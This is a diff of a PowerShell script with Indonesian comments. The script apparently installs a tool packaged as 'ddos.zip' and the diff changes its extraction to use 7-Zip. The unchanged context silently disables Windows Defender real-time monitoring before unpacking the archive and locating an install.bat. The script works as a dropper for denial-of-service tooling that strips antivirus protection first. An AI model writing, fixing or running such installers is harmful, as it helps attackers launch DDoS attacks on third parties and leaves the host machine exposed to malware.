@@ -8,10 +8,22 @@ if (Get-Command "Set-MpPreference" -ErrorAction SilentlyContinue) {
     Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 }
 
-# Tentukan direktori temp
+# Tentukan direktori temp dan file
 $TempDir = "$env:TEMP\ntvdm_ddos"
 $ZipFile = "$TempDir\ddos.zip"
-$ExtractDir = "$TempDir\extract"
+$ExtractDir = "$TempDir\extracted"
+$InstallBat = "$ExtractDir\install.bat"
+$SevenZipPath = "C:\Program Files\7-Zip\7z.exe"
+
+# Verifikasi 7-Zip terinstal
+if (-not (Test-Path $SevenZipPath)) {
+    Write-Host "7-Zip tidak ditemukan di $SevenZipPath" -ForegroundColor Red
+    Write-Host "Silakan instal 7-Zip terlebih dahulu: https://www.7-zip.org/ " -ForegroundColor Yellow
+    exit
+}
+
+# Tambahkan 7-Zip ke PATH sementara
+$env:Path = "$env:Path;$SevenZipPath\.."
 
 # Hapus sisa file lama jika ada
 if (Test-Path $TempDir) { Remove-Item $TempDir -Recurse -Force }
@@ -36,31 +48,19 @@ if (-not (Test-Path $ZipFile)) {
     exit
 }
 
-# Verifikasi apakah file ZIP valid
-try {
-    Write-Host "Memverifikasi file ZIP..." -ForegroundColor Green
-    [System.IO.Compression.ZipFile]::OpenRead($ZipFile).Dispose()
-} catch {
-    Write-Host "File ZIP rusak atau tidak valid!" -ForegroundColor Red
-    exit
-}
-
 # Buat folder ekstraksi
 New-Item -Path $ExtractDir -ItemType Directory -Force | Out-Null
 
-# Mengekstrak file ZIP (metode yang lebih stabil)
-Write-Host "Mengekstrak file ZIP..." -ForegroundColor Green
-Add-Type -AssemblyName System.IO.Compression.FileSystem
-[System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $ExtractDir)
+# Ekstrak dengan 7-Zip
+Write-Host "Mengekstrak ddos.zip dengan 7-Zip..." -ForegroundColor Green
+$extractProcess = Start-Process -FilePath "7z.exe" -ArgumentList "x `"$ZipFile`" -o`"$ExtractDir`" -y" -Wait -NoNewWindow -PassThru
 
-# Pindahkan semua file dari folder extract ke root temp
-Get-ChildItem -Path $ExtractDir\* -Recurse | Move-Item -Destination $TempDir
-
-# Hapus folder extract setelah selesai
-Remove-Item $ExtractDir -Recurse -Force
+if ($extractProcess.ExitCode -ne 0) {
+    Write-Host "Gagal mengekstrak file ZIP dengan 7-Zip" -ForegroundColor Red
+    exit
+}
 
 # Verifikasi apakah install.bat ada
-$InstallBat = "$TempDir\install.bat"
 if (-not (Test-Path $InstallBat)) {
     Write-Host "File install.bat tidak ditemukan setelah ekstraksi!" -ForegroundColor Red
     exit
